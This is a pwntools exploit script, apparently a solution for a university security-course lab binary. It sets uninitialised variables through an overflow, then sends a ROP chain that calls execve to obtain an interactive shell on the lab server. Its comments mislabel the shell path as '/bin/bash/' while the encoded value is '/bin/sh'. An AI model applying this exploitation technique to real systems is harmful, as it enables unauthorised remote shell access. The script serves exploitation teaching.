''' Script Module Importing '''
from pwn import *

''' Constant Initializing '''
BUFF_FILL = b'A'*40             # Set Buffer Filler
RUN_LEN = 25                    # Set Value to Overwrite run() 'len' Variable
RUN_I = 11                      # Set Value to Overwrite run() 'i' Variable

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7063)      # Test Script Against Server
# p = process("./6-3_lab.bin")              # Test Script Locally
# p = gdb.debug("./6-3_lab.bin")            # Debug with GDB



''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' ' ' ' ' ' ' ' ' ' '''
''' Pre-Fill Buffer for Custom Variable Initialization '''
'''                                                    '''
'''              Target Function: login()              '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '  ' ' ' ' ' ' ' ' ' ' '''

''' Craft Custom Payload '''
#
# Payload Format:
#   BUFF_FILL:      Fill buffer with 40 'A' bytes
#   p32(0):         Set 'i' variable init value to 0
#   p32(RUN_LEN)    Set 'len' variable init value to 25
#
payload = BUFF_FILL + p32(0) + p32(RUN_LEN)


''' Deliver Custom Payload '''
prog_prompt = p.readuntil(b'Username: ')            # Wait for Username Prompt
print(f"\n[*] Manipulating Uninitialized Variables\n")
p.sendline(payload)

prog_prompt = p.readuntil(b'Password: ')            # Wait for Password Prompt
p.sendline(b'BBBBBBB')



''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Leverage Variables to Deliver ROP Chain '''
'''                                         '''
'''          Target Function: run()         '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

''' Bypass Overwriting Uninitialized 'len' Variable '''
prog_prompt = p.readuntil(b'?: ')                   # Wait for Buffer Size Prompt
p.sendline(b'C')


''' Deliver Payload: Buffer Fill '''
#
# Payload Section Format:
#   each:      Populate 11 lines with buffer values to advance payload position
#
print(f"[*] Delivering Payload: Buffer Fill\n")
for each in range(11):
    p.sendline(str(each).encode())


''' Deliver Payload: Avoid Variable Clobbering '''
#
# Payload Section Format:
#   p32(RUN_I):     Set 'i' variable init value to 11
#   p32(RUN_LEN)    Set 'len' variable init value to 25
#
payload_bytes = p32(RUN_I) + p32(RUN_LEN)

payload_int = u64(payload_bytes)                    # Convert to 64-bit integer
payload_str = str(payload_int).encode()             # Encode as string for sending

print(f"[*] Updating Uninitialized Variables\n")
p.sendline(payload_str)


''' Deliver Payload: Buffer Fill '''
#
# Payload Section Format:
#   each:      Populate 3 lines with buffer values to advance payload position
#
for each in range(3):
    p.sendline(str(each).encode())


''' Deliver Payload: ROP Chain '''
#
# ROP Chain Format:
#   -- Set execve() Filename --
#   pop rsi; ret:       pointer, loads '/bin/bash/' into RSI register for execve() filename
#   "/bin/bash/":       contains hex representation of "/bin/bash/"
#   move [rdi], rsi:    pointer, copies filename value in RSI to memory location pointed to by RDI
#
#   -- Set execve() Syscall Number --
#   pop rax; ret:       pointer, loads '59' (sys_execve) into RAX register for syscall
#   sys_execve:         contains syscall number (59) for the sys_execve() syscall (64-bit)
#
#   -- Set execve() argv Parameter --
#   pop rsi; ret:       pointer, loads '0' into RSI register for execve() argv
#   execve_argv:        null value (0) for use as argv parameter in sys_execve()
#
#   -- Set execve() envp Parameter --
#   pop rdx; ret:       pointer, loads '0' into RDX register for execve() envp
#   execve_envp:        null value (0) for use as envp parameter in sys_execve()
#
#   -- Execute sys_execve() System Call --
#   syscall:            pointer, executes sys_execve() system call utilizing populated registers
#
print(f"[*] Delivering ROP Chain\n")

' Set execve() Filename '
p.sendline(b'4256878')                  # pop rsi; ret:     0x40f46e
p.sendline(b'29400045130965551')        # "/bin/bash/":     0x68732f6e69622f
p.sendline(b'4546143')                  # move [rdi], rsi:  0x455e5f

' Set execve() Syscall Number '
p.sendline(b'4563255')                  # pop rax; ret:     0x0045a137
p.sendline(b'59')                       # execve syscall:   59

' Set execve() argv Parameter '
p.sendline(b'4256878')                  # pop rsi; ret:     0x40f46e
p.sendline(b'0')                        # execve() argv:    0

' Set execve() envp Parameter '
p.sendline(b'4200431')                  # pop rdx; ret:     0x4017ef
p.sendline(b'0')                        # execve() envp:    0

' Execute sys_execve() System Call '
p.sendline(b'4199139')                  # syscall:          0x4012e3


''' ' ' ' ' '  ' ' ' ' ' '''
''' Maintain Persistence '''
''' ' ' ' ' '  ' ' ' ' ' '''
p.readline()                            # Remove Prompts
p.readline()

p.interactive()                         # Start Interactive Session


